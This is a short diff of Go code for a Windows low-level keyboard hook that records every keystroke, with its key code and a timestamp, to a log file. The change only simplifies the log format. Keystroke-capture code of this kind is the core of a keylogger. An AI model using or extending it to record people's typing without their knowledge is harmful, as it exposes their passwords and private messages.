@@ -148,14 +148,14 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 				} else if capsLockOn && !shiftPressed {
 					value = transform(value, capsLockOn)
 				}
-				output = fmt.Sprintf("Keydown: %s (0x%04X)", value, vkCode)
+				output = fmt.Sprintf("%s (0x%04X)", value, vkCode)
 			} else {
-				output = fmt.Sprintf("Keydown: Unknown (0x%04X)", vkCode)
+				output = fmt.Sprintf("Unknown (0x%04X)", vkCode)
 			}
 
 			// Write to file
 			if file != nil {
-				if _, err := file.WriteString(fmt.Sprintf("%v : %v : %v\n", time.Now(), vkCode, output)); err != nil {
+				if _, err := file.WriteString(fmt.Sprintf("%v : %v\n", time.Now(), output)); err != nil {
 					log.Printf("Error writing to file: %v", err)
 				}
 			} else {
